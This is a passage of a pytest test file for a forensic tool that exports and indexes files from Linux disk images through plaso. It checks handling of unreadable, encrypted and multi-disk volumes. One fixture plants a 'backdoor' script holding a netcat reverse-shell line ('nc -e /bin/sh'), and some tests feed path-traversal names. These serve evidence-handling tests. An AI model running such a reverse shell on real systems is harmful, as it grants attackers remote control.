    assert len(rows.splitlines()) == len(rows.split("\n")) == result["entries_listed"] + 1
    refused = result["not_exported"]["name holds characters that cannot be passed to image_export"]
    assert "p5/lvm1:/etc/a^b^c^d^e" in refused and "p5/lvm1:/etc/../../../outside" in refused
    assert not any("\n" in p or " " in p or ".." in p for p in fake.filters[ROOT])
    # Every character of a name is matched as itself, and % cannot start a variable.
    assert "/etc/a\\%b\\{c\\}\\.conf" in fake.filters[ROOT]
    assert outside.stat().st_mtime_ns == before and outside.read_bytes() == b"mine"
    # image_export takes a backslash for a separator and ".." for "_": the copy is looked
    # for where it writes it, never up the tree from the export.
    assert linux._as_stored(Path("/x"), "/etc/a\\..\\..\\..\\b") == Path("/x/etc/a/_/_/_/b")
    # A later call reads the listing the first one kept, row for row.
    again = _run(monkeypatch, fake, image, paths=["/etc"])["results"]["requested"]
    assert "p5/lvm1:/etc/a^b^c^d^e" in str(again["not_exported"])
    assert all(Path(p).is_relative_to(again["root"]) for p in again["exported"])


# --- what cannot be read ---------------------------------------------------


def test_a_directory_that_cannot_be_read_costs_only_itself_and_is_named(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One name that is not valid UTF-8 stops image_export for good; var/ was never reached.

    The listing has the same hole: log2timeline counts the directory as a
    warning and lists what it had read of it.
    """
    files = {ROOT: {**SERVER[ROOT], "/tmp/zz-after": b"unreachable\n", "/tmp/.x": b"hidden\n"}}
    fake = FakePlaso(files)
    fake.unreadable = {"/tmp": "caf\udce9.txt"}  # sorts after apache-xTRhUVX, before zz-after

    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    assert _held(root) == [
        "etc/cron.d/backup",
        "etc/hostname",
        "etc/passwd",
        "lib/systemd/system/ssh@.service",
        "root/.bash_history",
        "tmp/.x",
        "tmp/apache-xTRhUVX",
        "var/log/auth.log",  # not reached by the first run, which stopped in /tmp
        "var/www/html/index.php",
    ]
    assert len(fake.ran("image_export")) > 1
    assert result["status"] == "incomplete"
    assert result["listing_incomplete"] == ["p5/lvm1:/tmp"]
    assert result["not_exported"]["image_export did not copy it"] == ["p5/lvm1:/tmp/zz-after"]
    assert "stopped early and was repeated in parts" in result["problems"][0]
    assert "OSError: unable to read" in result["problems"][0]
    assert "listing_incomplete" in result["note"]

    # Nor does a later call answer as if the export were whole.
    again = _run(monkeypatch, fake, image)["results"]
    assert again["status"] == "already exported, incomplete"
    assert again["listing_incomplete"] == ["p5/lvm1:/tmp"]


def test_retrying_a_failed_export_is_bounded(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    files = {ROOT: {"/etc/passwd": b"x\n"}}
    for n in range(40):
        files[ROOT][f"/etc/d{n:02}/conf"] = b"x\n"
    fake = FakePlaso(files)
    fake.unreadable = {f"/etc/d{n:02}": "" for n in range(40)}  # not one of them can be read
    monkeypatch.setattr(linux, "_MAX_RUNS", 6)

    result = _run(monkeypatch, fake, image)["results"]

    assert len(fake.ran("image_export")) == 6
    assert _held(Path(result["export_root"])) == []
    # All 41 are accounted for, whether a run was spent on them or not.
    assert result["not_exported"]["image_export did not copy it"][-1] == "... and 31 more"
    assert result["status"] == "incomplete"

    monkeypatch.setattr(linux, "_MAX_RUNS", 200)
    whole = _run(monkeypatch, fake, image, force=True)["results"]
    assert _held(Path(whole["export_root"])) == ["etc/passwd"]
    assert whole["not_exported"]["image_export did not copy it"][-1] == "... and 30 more"


def test_warnings_pinfo_cannot_name_are_still_counted(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n", "/srv/data": b"x\n"}})
    fake.unreadable = {"/srv": "zzz"}  # nothing of the targeted set is in it
    monkeypatch.setattr(
        linux, "_find_plaso_cmd", lambda tool: None if tool == "pinfo" else [f"/usr/bin/{tool}"]
    )

    result = _run(monkeypatch, fake, image)["results"]

    assert result["listing_incomplete"] == ["1 directories, which pinfo did not name"]
    assert result["status"] == "incomplete" and result["files_exported"] == 1


def test_an_image_plaso_reads_as_one_plain_file_is_unreadable(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Truncated, empty, random bytes, btrfs: plaso finds no volume and stats the image itself."""
    event = _events(image, volume="")[0]
    event["pathspec"] = {"type_indicator": "OS", "location": image}
    event["file_system_type"] = "OS"
    fake = FakePlaso({}, [event, {**event, "timestamp_desc": "Creation Time"}])
    monkeypatch.setattr(linuxvol, "scan", lambda path: Scan((Volume(0, "btrfs"),)))

    result = _run(monkeypatch, fake, image)

    assert result["status"] == "error" and result["error_type"] == "unreadable"
    assert "no Linux volume or file system it can read" in result["error_message"]
    assert "btrfs file system at sector 0" in result["error_message"]
    assert not fake.ran("image_export") and case.get_sources() == []
    # Nothing says the image was exported: the next tool is not sent to an empty directory.
    home = export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image).parent
    assert not home.exists()


def test_an_encrypted_volume_is_an_error_that_says_why(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso({})
    fake.encrypted = True
    monkeypatch.setattr(linuxvol, "scan", lambda image: Scan((Volume(0, "luks"),)))

    result = _run(monkeypatch, fake, image)

    assert result["status"] == "error" and result["error_type"] == "unreadable"
    assert "Encrypted volume found" in result["error_message"]
    assert "LUKS-encrypted volume at sector 0" in result["error_message"]
    assert "not examined" in result["suggestion"]
    assert len(fake.ran("log2timeline")) == 1, "nothing but the encrypted volume to read"
    assert not fake.ran("psort") and not fake.ran("image_export")
    assert case.get_sources() == []


def test_an_encrypted_partition_does_not_hide_the_ones_beside_it(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """plaso stops at a LUKS partition and reads nothing: it is told to read the others."""
    fake = FakePlaso({"p1": {"/etc/passwd": b"root:x:0:0::/root:/bin/sh\n"}})
    fake.encrypted = True
    found = Scan((Volume(133120, "luks"),), frozenset({"ext"}), ((2048, 1), (133120, 2)))
    monkeypatch.setattr(linuxvol, "scan", lambda image: found)

    result = _run(monkeypatch, fake, image)["results"]

    first, second = fake.ran("log2timeline")
    assert _arg(first, "--partitions") == "all" and _arg(second, "--partitions") == "1"
    assert result["status"] == "exported" and result["files_exported"] == 1
    assert result["not_read"] == ["LUKS-encrypted volume at sector 133120"]
    assert (Path(result["export_root"]) / "etc/passwd").is_file()


def test_a_volume_group_on_several_disks_is_named_as_not_read(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """dfVFS reads the plain partition and nothing of the group; the result must not look whole."""
    monkeypatch.setattr(linuxvol, "scan", lambda image: Scan((Volume(501760, "lvm", "vg0", 2),)))

    result = _run(monkeypatch, FakePlaso({"p1": SERVER["p1"]}), image)["results"]

    assert result["not_read"] == [
        "LVM physical volume at sector 501760, volume group vg0 on 2 disks of which this "
        "image is one"
    ]
    assert result["files_exported"] == 0


def test_a_volume_group_that_yields_no_file_system_is_named_too(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    found = Scan((Volume(501760, "lvm", "vg0", 1),), frozenset({"ntfs"}))
    monkeypatch.setattr(linuxvol, "scan", lambda image: found)

    result = _run(monkeypatch, FakePlaso({"p1": SERVER["p1"]}), image)["results"]

    assert result["not_read"] == [
        "the LVM volume group: dfVFS found no file system in its volumes",
        # A disk with NTFS beside the Linux volume: where its files are to be had.
        "the NTFS or exFAT file system on this disk: not listed here, run_fls reads it",
    ]


def test_plaso_missing_or_a_directory_given_is_said_plainly(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso(SERVER)
    result = _run(monkeypatch, fake, str(tmp_path / "evidence"))
    assert result["error_type"] == "file_not_found" and "needs no export" in result["suggestion"]

    monkeypatch.setattr(
        linux, "_find_plaso_cmd", lambda tool: None if tool == "image_export" else ["/x"]
    )
    result = _run(monkeypatch, fake, image)
    assert result["error_type"] == "binary_missing" and "image_export" in result["error_message"]
    assert fake.calls == []


@pytest.mark.parametrize("tool", ["log2timeline", "psort"])
def test_a_listing_pass_that_fails_is_an_error_whatever_it_had_written(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, tool: str
) -> None:
    """psort out of temporary space leaves the older half of the events: /etc/passwd may be gone.

    Indexed as a listing, that is an export with status "exported" that lacks
    the root volume, and a second call answers "already exported".
    """
    fake = FakePlaso(SERVER)
    fake.broken = tool

    result = _run(monkeypatch, fake, image)

    assert result["status"] == "error" and result["error_type"] == "unreadable"
    assert f"{tool} exited 1" in result["error_message"]
    assert "No space left on device" in result["error_message"]
    assert "for that reason alone" in result["suggestion"]
    assert not fake.ran("image_export") and case.get_sources() == []
    home = export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image).parent
    assert not home.exists()

    fake.broken = ""  # with room, the same call lists and exports
    assert _run(monkeypatch, fake, image)["results"]["status"] == "exported"


def test_no_listing_is_started_without_temporary_space_for_it(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Short of space log2timeline neither fails nor finishes: it waits out its timeout."""
    fake = FakePlaso(SERVER)
    first = _run(monkeypatch, fake, image)["results"]
    calls = len(fake.calls)
    monkeypatch.setattr(shutil, "disk_usage", lambda path: SimpleNamespace(free=10**8))

    result = _run(monkeypatch, fake, image, force=True)

    assert result["error_type"] == "no_space" and "95 MiB free" in result["error_message"]
    assert "not examined" in result["suggestion"] and len(fake.calls) == calls
    # What an earlier call exported is still there, and needs no listing to be read again.
    assert _run(monkeypatch, fake, image)["results"] == {**first, "status": "already exported"}


def test_an_export_that_cannot_be_written_is_an_error_not_an_exception(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def full(*args: object, **kwargs: object) -> None:
        raise OSError(errno.ENOSPC, "No space left on device")

    monkeypatch.setattr(linux, "_export", full)

    result = _run(monkeypatch, FakePlaso(SERVER), image)

    assert result["error_type"] == "write_failed" and "No space left" in result["error_message"]
    home = export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image).parent
    assert not (home / EXPORT_MARKER).exists(), "nothing says the image was exported"
    # However long the image's name, its directory can be created.
    long_name = str(Path(image).with_name("L" * 246 + ".raw"))
    assert len(export_dir(tmp_path, long_name).parent.name.encode()) <= 255
    assert (
        len(export_dir(tmp_path, long_name.replace("L", "\U0001f4be")).parent.name.encode()) <= 255
    )


def test_the_same_directory_on_two_volumes_is_two_rows(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A directory's events name no volume: the inode keeps one /lib's times off the other's."""
    files = {
        ROOT: {"/etc/passwd": b"x\n", "/lib/x.so": b"\x7fELF"},
        "p5/lvm2": {"/lib/dpkg/status": b"Package: x\n", "/cache/man/index.db": b"\x00"},
    }
    first = [{**e, "inode": "16"} for e in _events("/lib", kind="directory")]
    second = [
        {**e, "inode": "14"} for e in _events("/lib", kind="directory", modified=MODIFIED + 60)
    ]

    result = _run(monkeypatch, FakePlaso(files, first + second), image)["results"]

    rows = re.findall(r"^\?\tdirectory\t.*\t/lib$", _text(case, "linux.filelist"), re.MULTILINE)
    assert len(rows) == 2 and result["entries_listed"] == 6
    assert sorted(row.split("\t")[6] for row in rows) == [
        "2019-10-05T11:14:38Z",
        "2019-10-05T11:15:38Z",
    ]


# --- later calls -----------------------------------------------------------


def test_a_second_call_is_answered_from_the_first(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso(SERVER)
    first = _run(monkeypatch, fake, image)["results"]
    calls = len(fake.calls)

    second = _run(monkeypatch, fake, image)["results"]

    assert second == {**first, "status": "already exported"}
    assert len(fake.calls) == calls
    assert [s.source_name for s in case.get_sources()].count("linux.filelist") == 1

    _run(monkeypatch, fake, image, force=True)
    assert len(fake.ran("log2timeline")) == 2


def test_a_listed_file_is_exported_on_request_without_listing_again(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso(SERVER)
    root = Path(_run(monkeypatch, fake, image)["results"]["export_root"])

    result = _run(monkeypatch, fake, image, paths=["/opt/app", "usr/bin/python3", "/nope"])
    asked = result["results"]["requested"]

    assert len(fake.ran("log2timeline")) == 1, "the listing the first call kept is enough"
    more = Path(asked["root"])
    assert more.parent == root.parent / "requested"
    assert asked["exported"] == [
        str(more / "opt/app/config.php"),
        str(more / "usr/bin/python3"),
    ]
    assert asked["not_in_listing"] == ["/nope"] and asked["paths_ignored"] == 0
    assert int((more / "opt/app/config.php").stat().st_mtime) == MODIFIED
    # A directory root of its own, read like the first.
    assert "\topt/app/config.php" in dir_root(str(more)).listing()  # type: ignore[union-attr]
    # The same request is the same directory: asking twice does not pile up copies.
    again = _run(monkeypatch, fake, image, paths=["/nope", "/usr/bin/python3", "/opt/app/"])
    assert again["results"]["requested"]["root"] == str(more)
    assert sorted(p.name for p in more.parent.iterdir()) == [more.name]


def test_files_asked_for_are_indexed_as_part_of_a_linux_tree(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Their directory holds no etc/passwd, and their names no extension to go by."""
    files = {ROOT: {**SERVER[ROOT], "/usr/local/bin/backdoor": b"#!/bin/sh\nnc -e /bin/sh x\n"}}
    fake = FakePlaso(files)
    asked = _run(monkeypatch, fake, image, paths=["/usr/local/bin"])["results"]["requested"]
    assert "etc/passwd" not in _held(Path(asked["root"]))

    with pytest.MonkeyPatch.context() as patched:
        patched.setattr("mulder.server.tools.extract.app_files.shutil.which", lambda name: name)
        indexed = _tool_dispatch_sync["index_app_files"](
            case_id="test-case", image_path=asked["root"], directory_pattern="usr/local/bin"
        )["results"]

    assert indexed["extensions_used"] == ["*"] and indexed["files_indexed"] == 1
    assert "nc -e /bin/sh" in _text(case, "appfiles.usr.local.bin.backdoor")


def test_a_later_export_does_not_renumber_the_rows_already_indexed(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A row number of the indexed listing is the handle a file is read by."""
    fake = FakePlaso(SERVER)
    root = _run(monkeypatch, fake, image)["results"]["export_root"]
    indexed = _text(case, "tsk.filelist")
    row = re.search(r"^r/r (\d+):\tvar/log/auth\.log$", indexed, re.MULTILINE)
    assert row is not None

    _run(monkeypatch, fake, image, paths=["/opt/app", "/usr/bin"])  # sort before var/

    assert dir_root(root).listing() == indexed.strip()  # type: ignore[union-attr]
    assert icat(root, 0, row.group(1)).stdout.startswith(b"Oct  5 11:00:01 web01 sshd")


def test_the_first_call_may_name_extra_paths_and_more_than_are_taken_are_counted(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    paths = ["/opt/app/config.php", *(f"/nope/{n}" for n in range(250))]
    result = _run(monkeypatch, FakePlaso(SERVER), image, paths=paths)["results"]

    assert result["requested"]["files_exported"] == 1 and result["files_exported"] == 8
    assert os.path.isfile(result["requested"]["exported"][0])
    assert result["requested"]["paths_ignored"] == 51
    assert "\topt/app/config.php" not in _text(case, "tsk.filelist")


def test_exports_live_where_the_evidence_walk_does_not_go(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = Path(_run(monkeypatch, FakePlaso(SERVER), image)["results"]["export_root"])

    extracted = case_extract_dir(tmp_path / "cases", "test-case")
    assert root.parent.parent == extracted / EXPORTS_DIR and EXPORTS_DIR.startswith(".")
    assert root.parent.name.startswith("disk.E01-") and len(root.parent.name) == 21
